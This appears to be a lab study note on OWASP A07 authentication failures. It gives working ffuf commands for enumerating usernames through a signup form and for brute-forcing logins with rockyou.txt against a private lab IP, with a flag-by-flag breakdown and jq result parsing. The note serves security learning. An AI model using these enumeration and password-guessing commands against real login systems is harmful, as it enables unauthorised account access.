# A07 — Authentication Failures
 
## Definition
The application can't reliably verify or bind a user's identity.
 
**Common causes:**
- User enumeration
- Weak/guessable passwords (no lockout or rate limiting)
- Logic flaws in the login/registration flow
- Insecure session/cookie handling
 
**Example:** logging in as an admin account by simply using `admin` as
the username (no real verification behind it).
 
---
 
## Username Enumeration
Basic idea: take a website's signup/login form, fill in username + details,
submit, and check whether the response prompts "username already exists."
If the app leaks this distinction, an attacker can enumerate valid
usernames/emails without ever guessing a password.
 
### Using `ffuf` for enumeration
```bash
ffuf -w /usr/share/wordlist... -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.49.6.1/customers... \
  -mr "username already exists"
```
 
**Flag breakdown:**
| Flag | Purpose |
|------|---------|
| `-w` | Selects wordlist location |
| `-X` | Specifies the HTTP request method (e.g. POST) |
| `-d` | The data being sent in the request body |
| `FUZZ` | Keyword `ffuf` fills in from the wordlist, one entry at a time |
| `-H` | Adds a header to the request |
| `-u` | Specifies the URL the request is made to |
| `-mr` | Text on the page we're looking to match to confirm a hit — e.g. confirming we found a valid username |
 
### Generating JSON output for parsing results
```bash
ffuf ... -of json -o ffuf.json
jq -r '.results[].input.FUZZ' ffuf.json > user.txt
cat user.txt
```
 
---
 
## Brute Forcing (credential stuffing)
Susceptible to rate limiting — use a file of usernames (harvested from the
enumeration step above) rather than blind guessing.
 
```bash
ffuf -w <user.txt>:W1,/usr/share/.../rockyou.txt:W2 \
  -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://.../customer/login \
  -fc 200
```
 
- `W1`, `W2` — your own custom keyword names for each wordlist, referenced
  in the `-d` payload
- `-fc 200` — filter by HTTP response code; used here to filter *out*
  responses that return 200 (successful logins would differ from the
  default failed-login response code)
